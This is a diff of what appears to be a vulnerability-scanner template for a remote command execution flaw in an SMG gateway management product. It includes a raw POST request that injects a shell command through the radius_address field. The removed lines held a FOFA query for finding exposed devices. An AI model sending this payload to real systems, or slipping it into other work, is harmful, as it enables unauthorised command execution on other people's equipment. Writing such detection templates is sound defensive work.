@@ -3,12 +3,8 @@ info:
   name: 杭州新威数字信息-SMG网关管理软件_9-2radius存在远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yy8enqz4hyawabnd'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yy8enqz4hyawabnd
-    fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
 http:
 - raw:
   - 'POST /en/9-2radius.php?authority=6 HTTP/1.1
@@ -18,11 +14,7 @@ http:
     Host: {{Hostname}}
 
 
-    save=1&enable_radius=1&radius_address=/'';id;+#+
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757220688950-0d10e2a8-f8ca-4b7e-bb18-7489ad91ed68.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757220689120-3a9d32f4-fdde-4cdf-aba9-48febac0a9f0.png)'
+    save=1&enable_radius=1&radius_address=/'';id;+#+'
   redirects: false
   matchers:
   - status:
